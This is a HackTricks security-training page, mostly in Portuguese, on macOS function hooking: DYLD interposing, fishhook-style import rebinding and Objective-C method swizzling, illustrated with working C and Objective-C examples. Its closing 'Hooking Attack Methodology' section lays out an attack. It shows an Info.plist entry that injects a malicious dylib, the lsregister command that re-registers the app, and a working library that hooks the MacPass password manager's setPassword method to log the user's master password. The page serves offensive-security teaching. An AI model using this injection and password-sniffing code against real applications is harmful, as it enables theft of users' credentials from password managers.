# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Crie uma **dylib** com uma seção **`__interpose` (`__DATA___interpose`)** (ou uma seção marcada com **`S_INTERPOSING`**) contendo tuplas de **ponteiros de função** que referenciam as funções **original** e **substituta**.

Então, **injete** a dylib com **`DYLD_INSERT_LIBRARIES`** (o interposing precisa ocorrer antes de a app principal carregar). Obviamente, as [**restrições** aplicadas ao uso de **`DYLD_INSERT_LIBRARIES`**](macos-library-injection/index.html#check-restrictions) também se aplicam aqui.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> A variável de ambiente **`DYLD_PRINT_INTERPOSING`** pode ser usada para depurar interposing e imprimirá o processo de interposição.

Também note que **interposing ocorre entre o processo e as bibliotecas carregadas**, isso não funciona com o shared library cache.

### Dynamic Interposing

Agora também é possível interpor uma função dinamicamente usando a função **`dyld_dynamic_interpose`**. Isso permite **programaticamente** interpor uma função em **runtime** em vez de fazer isso apenas desde o **início**.

Só é necessário indicar os **tuples** da **função a substituir e da função de substituição**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Rebinding da Import Table (fishhook-style)

Se você já tem execução de código **dentro do processo** e quer hookar uma **função C importada** sem reiniciar o target, um primitive muito comum é **symbol rebinding** (popularizado por **`fishhook`**).

Em vez de usar a seção **`__interpose`**, essa técnica percorre os metadados Mach-O (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) e **sobrescreve o import slot** usado pela imagem atual. Isso é muito útil para hookar funções em um processo **já em execução** ou para hookar **apenas uma imagem** com **`rebind_symbols_image`**.

> [!TIP]
> Isso afeta apenas chamadas que realmente passam por um **import pointer**. Se a função alvo for **chamada diretamente dentro da mesma imagem**, não existe um slot importado para reescrever, então essa técnica não verá esse call site.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Em versões recentes do macOS, muitos alvos de rebinding não estão mais em páginas graváveis de **`__DATA`**. Rebinders normalmente precisam tornar **`__DATA_CONST`** gravável temporariamente antes de fazer patch do ponteiro. Além disso, no Apple Silicon / **`arm64e`** você deve esperar ponteiros autenticados e indireção extra em **`__AUTH_CONST.__auth_got`**, então um rebinder que só varre as seções clássicas de ponteiros de símbolo lazy/non-lazy pode perder alguns call sites.

> [!CAUTION]
> A ABI **`arm64e`** usa **Pointer Authentication (PAC)** para muitos ponteiros de função. Escritas cegas de ponteiro que costumavam funcionar em Intel podem quebrar um call site no Apple Silicon. Ao escrever seu próprio rebinder ou inline hooker, esteja preparado para usar helpers de **`<ptrauth.h>`** como **`ptrauth_sign_unauthenticated`** ou **`ptrauth_auth_and_resign`** e teste especificamente em alvos **`arm64e`**.

Para mais detalhes sobre **`__AUTH`**, **`__AUTH_CONST`** e **`__auth_got`**, confira [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

Em ObjectiveC, é assim que um method é chamado: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

São necessários o **object**, o **method** e os **params**. E quando um method é chamado, uma **msg is sent** usando a function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

O object é **`someObject`**, o method é **`@selector(method1p1:p2:)`** e os arguments são **value1**, **value2**.

Seguindo as estruturas do object, é possível alcançar um **array of methods** onde os **names** e os **pointers** para o code do method estão **located**.

> [!CAUTION]
> Note que, como methods e classes são acessados com base em seus names, essa information é armazenada no binary, então é possível recuperá-la com `otool -ov </path/bin>` ou [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

É possível acessar a information dos methods, como name, number of params ou address, como no seguinte exemplo:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

A função **`method_exchangeImplementations`** permite **alterar** o **endereço** da **implementação** de **uma função pela outra**.

> [!CAUTION]
> Então, quando uma função é chamada, o que é **executado é a outra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Neste caso, se o **código de implementação do método legítimo** **verificar** o **nome do método**, ele pode **detectar** esse swizzling e impedir que ele seja executado.
>
> A técnica a seguir não tem essa restrição.

### Method Swizzling com method_setImplementation

O formato anterior é estranho porque você está alterando a implementação de 2 métodos, um pelo outro. Usando a função **`method_setImplementation`** você pode **alterar** a **implementação** de **um método pelo outro**.

Lembre-se apenas de **armazenar o endereço da implementação do original** se for chamá-lo a partir da nova implementação antes de sobrescrevê-lo, porque depois será muito mais complicado localizar esse endereço.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Nesta página, foram discutidas diferentes maneiras de hook functions. No entanto, elas envolviam **executar código dentro do processo para atacar**.

Para fazer isso, a técnica mais fácil de usar é injetar um [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). No entanto, imagino que isso também poderia ser feito via [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

No entanto, ambas as opções são **limitadas** a binários/processos **unprotected**. Confira cada técnica para aprender mais sobre as limitações.

Porém, um ataque de function hooking é muito específico; um atacante fará isso para **roubar informações sensíveis de dentro de um processo** (caso contrário, você apenas faria um ataque de process injection). E essa informação sensível pode estar localizada em Apps baixados pelo usuário, como MacPass.

Então, o vetor do atacante seria encontrar uma vulnerabilidade ou remover a assinatura da aplicação, injetar a variável de ambiente **`DYLD_INSERT_LIBRARIES`** através do Info.plist da aplicação adicionando algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
e então **re-registre** a aplicação:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Adicione nessa biblioteca o código de hooking para exfiltrar as informações: Passwords, messages...

> [!CAUTION]
> Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referências

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
